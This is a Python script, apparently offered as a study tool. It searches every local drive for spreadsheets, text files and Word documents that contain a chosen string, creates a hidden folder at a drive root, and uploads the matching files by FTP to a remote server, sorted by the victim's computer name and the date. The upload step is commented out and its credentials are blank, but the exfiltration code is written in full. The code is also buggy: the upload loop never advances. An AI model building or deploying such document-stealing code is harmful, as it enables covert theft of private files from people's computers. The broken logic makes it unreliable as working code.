# The following code is written by Rohit Saxena. STUDY PURPOSE ONLY. Any unauthorized use or modification is prohibited.
import ctypes
import datetime
import ftplib
import glob
import os
import string
from urllib.error import URLError
from urllib.request import *
import shutil
import docx
import openpyxl

errorCount = 0
i = 0
j = 0
rvs = []
host = ""  # FTP Host URL
ftp_id = ""  # FTP CLIENT ID
ftp_pw = ""  # FTP CLIENT PASSWORD
_ftp_root_folder_ = 'htdocs'  # FTP root folder
newdir = os.environ['COMPUTERNAME']  # FTP Main folder name
ft = []
todaysDate = str(datetime.datetime.today())  # FTP sub-folder name
ftp = ftplib.FTP()


def _rS_sign():
    print("|""---------""    ""------------")
    print("|""        ""|""  ""  |")
    print("|""        ""|""  ""  |")
    print("|""---------""    ""|")
    print("|""-""            ""------------")
    print("|""  ""-""                     ""|")
    print("|""    ""-""                   ""|")
    print("|""       ""-""   ""  ------------")
    print("The following code is written by Rohit Saxena. STUDY PURPOSE ONLY. Any unauthorized use or modification is "
          "prohibited.")
    return True


def _rSAdmin_Check():
    try:
        is_admin = (os.getuid() == 0)
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin


def _rSInternet_Check_():  # Internet Tester
    while True:
        try:
            urlopen('https://www.central16.in', timeout=1)
            return
        except URLError as e:
            print('URL Error: ', e.reason)  # remove print is building exe
            pass


def _RsBackupWriter(rrs, pp):  # local backup (unfinished)
    global j
    print('BACKUP FOLDER STARTED /N rvs len : ', len(rrs))
    trs = open(pp, "a")
    for item in rrs:
        trs.write("%s\n" % item)
    print('Backup File Created')
    file1 = open(pp, "r")
    print(file1.read())
    file1.close()


def _RsXlsx_(SS, CC):  # XLSX Reader
    rs = openpyxl.load_workbook(CC, read_only=True, data_only=True)
    ws = rs.active
    for i in range(1, ws.max_row + 1):
        for j in range(1, ws.max_column + 1):
            if SS == ws.cell(i, j).value:
                print("Found in cell :", ws.cell(i, j), "File Location :", CC)
                rvs.append(CC)


def _RsTxt_(SS, CC):  # TXT Reader
    file1 = open(CC, 'r', encoding='UTF8', errors='ignore')
    flag = 0
    index = 0
    for line in file1:
        index += 1
        if SS in line:
            flag = 1
            break
    if flag != 0:
        print('String', SS, 'Found In Line: ', index, 'File Path: ', CC)
        rvs.append(CC)
    file1.close()


def _RsDocx_(SS, CC):  # DOCX Reader
    flag = 0
    index = 0
    doc = docx.Document(CC)
    for para in doc.paragraphs:
        index += 1
        if SS in para.text:
            flag = 1
            break
    if flag != 0:
        print('String', SS, 'Found In Line: ', index, 'File Path: ', CC)
        rvs.append(CC)


def _RsDirCheck_(rsdc):  # FTP Main Folder Checker
    x = 0
    for g in rsdc:
        if newdir in g:
            x = 1
    if x == 0:
        print(" New Directory created ---> ", newdir)
        ftp.mkd(newdir)


def _RsTodayFolderCheck_(rstfc):  # FTP Sub-Folder Checker
    x = 0
    for g in rstfc:
        if todaysDate in g:
            x = 1
    if x == 0:
        ftp.mkd(todaysDate)
        print("New Today's date folder created ---> ", todaysDate)


def _Rs_ftp_COPY_():  # FTP Client connector
    print('uploading data...')
    port = 21
    ftp.connect(host, port)
    print(ftp.getwelcome())
    print("Logging in...")
    ftp.login(ftp_id, ftp_pw)
    ftp.cwd(_ftp_root_folder_)
    ftp.retrlines('LIST', ft.append)
    _RsDirCheck_(ft)
    ftp.cwd(newdir)
    ft.clear()
    ftp.retrlines('LIST', ft.append)
    _RsTodayFolderCheck_(ft)
    ftp.cwd(todaysDate)


def _rS_FTP_file_transf(rvs):  # FTP File uploader
    try:
        rs = 0
        print('Uploading Data...')
        while rs != len(rvs):
            filename = rvs[rs]
            file_name, file_extension = os.path.splitext(filename)
            _FTP_File_Name_ = os.path.basename(file_name) + file_extension
            _ftpNewFileNMCmd_ = "STOR %s" % _FTP_File_Name_
            with open(filename, "rb") as file:
                ftp.storbinary(_ftpNewFileNMCmd_, file)
        rs += 1
        print('Upload Complete !')
        ftp.dir()
    except Exception:
        print(Exception)


def main():
    global errorCount
    if _rSAdmin_Check():
        print("admin access")
    else:
        print("No admin access")
    global i, j
    global rvs
    #    val = input("Enter extension : ")    #If specific extension only required uncheck and add val in _Rel_Path
    ff = input("Enter string : ")
    rs = ['%s:\\' % d for d in string.ascii_uppercase if os.path.exists('%s:\\' % d)]
    print('Active local drives ---> ', rs)
    FtypeXLSX = '.xlsx'
    FtypeTXT = '.txt'
    FtypeDOCX = '.docx'
    _Rel_Exp_ = '**/*'
    _Rel_Path_ = _Rel_Exp_
    # print('Selected file type = ', val)
    rss = []

    bck_dir = "rrs"  # LINE 154 - 166 REFERS LOCAL BACKUP (UNFINISHED)
    bck_file = "rrs.txt"
    print('Hidden folder named rss is created in first local drive from available drive list')
    pth = os.path.join(rs[0], bck_dir)
    if os.path.exists(pth):  # this if will flush the old backup folder and re-create new backup folder
        shutil.rmtree(pth)
    os.makedirs(pth)
    print('Hidden folder path: ', pth)
    print('Hidden file text.txt is created in hidden folder rss')
    CN = os.path.join(pth, bck_file)
    print('Hidden file location: ', CN)
    file1 = open(CN, "a")
    file1.close()
    if _rS_sign():
        print('Below files are present in system: '"\n")
        while i != len(rs):
            os.chdir(rs[i])
            for file in glob.glob(_Rel_Path_, recursive=True):
                # print(file)
                completeName = os.path.join(rs[i], file)
                # print('File path: ', completeName)
                file_name, file_extension = os.path.splitext(completeName)
                if file_extension == FtypeXLSX:
                    try:
                        _RsXlsx_(ff, completeName)
                    except Exception:
                        errorCount += 1
                        print('Error in reading file, File Path: ', completeName)
                if file_extension == FtypeTXT:
                    try:
                        _RsTxt_(ff, completeName)
                    except PermissionError:
                        errorCount += 1
                        print('Admin Permission Required File Path: ', completeName)
                if file_extension == FtypeDOCX:
                    try:
                        _RsDocx_(ff, completeName)
                    except Exception:
                        errorCount += 1
                        print('Error in reading file, File Path: ', completeName)
                rss.append(completeName)
            i += 1
    else:
        exit()
    print('System scan completed \n')
    # print(rss)
    print('Total File Scanned :', len(rss))
    print("Total file found: ", len(rvs))
    print("Total No of unreachable files (ACTION REQUIRED)", errorCount)
    if len(rvs) == 0:
        exit()
    print("\n", rvs)
    '''
    _Rs_ftp_COPY_()
    _rS_FTP_file_transf(rvs)          ONLY FOR FTP 
    print('calling backup')
    _RsBackupWriter(rvs, CN)  # LOCAL BACKUP CREATOR
    '''
    # shutil.rmtree(pth)              #FLUSH OLD BACKUP FILES (UNFINISHED) uncheck to delete local backup


_rSInternet_Check_()
if _rS_sign():
    main()
else:
    print("Author sign missing")
